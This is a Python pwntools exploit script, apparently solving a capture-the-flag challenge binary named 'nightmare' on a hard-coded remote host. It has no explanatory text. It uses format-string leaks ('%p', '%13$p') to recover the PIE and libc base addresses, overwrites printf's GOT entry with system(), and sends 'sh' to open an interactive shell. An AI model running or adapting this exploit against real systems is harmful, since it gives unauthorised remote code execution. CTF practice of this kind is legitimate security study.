from pwn import *
from time import sleep

def executeFmtStr(payload):
	target.sendlineafter(b'>', b'1')
	target.sendlineafter(b'> ', payload)
	return target.recvline().strip()

address = '94.237.62.166'
port = 49596

context.log_level = 'critical'
context.binary = binary = ELF('./nightmare')
libc = ELF('./libc6_2.31-0ubuntu9_amd64.so')

target = process()
fmtStr = FmtStr(execute_fmt=executeFmtStr)
target = remote(address,port)

target.sendlineafter(b'> ', b'2')
target.sendlineafter(b'>> ', b'%p')

pieOffset = 0x2079

targetPieAddress = int(target.recvline().strip().decode(), 16)
binary.address = targetPieAddress - pieOffset

print(f'PIE Base: {hex(binary.address)}')

target.sendlineafter(b'> ', b'2')
target.sendlineafter(b'>> ', b'%13$p')

libcOffset = 0x270b3

leakedLibc = int(target.recvline().strip().decode(),16)
libc.address = leakedLibc - libcOffset

print(f'Libc Base: {hex(libc.address)}')

printf = binary.got.printf
system = libc.symbols.system

target.send(b'1')

fmtStr.write(printf,system)
fmtStr.execute_writes()

target.sendline(b'2')
target.sendline(b'sh')

for _ in range(4):
	target.recvline()

target.interactive()



